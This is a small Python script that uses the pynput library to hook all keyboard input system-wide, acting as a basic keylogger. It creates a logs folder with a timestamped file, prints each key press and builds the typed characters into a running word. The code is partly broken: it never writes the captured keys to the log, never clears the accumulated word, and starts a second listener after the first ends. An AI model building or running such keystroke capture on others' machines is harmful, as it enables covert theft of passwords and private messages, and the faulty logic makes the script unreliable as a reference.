from pynput import keyboard
from datetime import datetime
import os

current_dir = os.listdir()
if "logs" not in current_dir:   
    os.mkdir("logs")

with open('logs/log.txt','a') as fl:
    fl.write("\n")
    fl.write(str(datetime.now()))
    fl.write("\n")

current_word = ""

def on_press(key):
    
    global current_word
    
    keey = str(key)

    if len(keey) > 3:

        if len(keey) == 4:
            current_word += keey[1]
            print("Key press: " + keey[1])

        elif key == keyboard.Key.space:
            print(current_word)

        
        elif key == keyboard.Key.tab:
            pass
        
        elif key == keyboard.Key.ctrl:
            pass
        
        elif key == keyboard.Key.alt:
            pass

    else:

        current_word += keey[1]
        print("Key press: " + keey[1])

def on_release(key):

    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

# ...or, in a non-blocking fashion:
listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)

listener.start()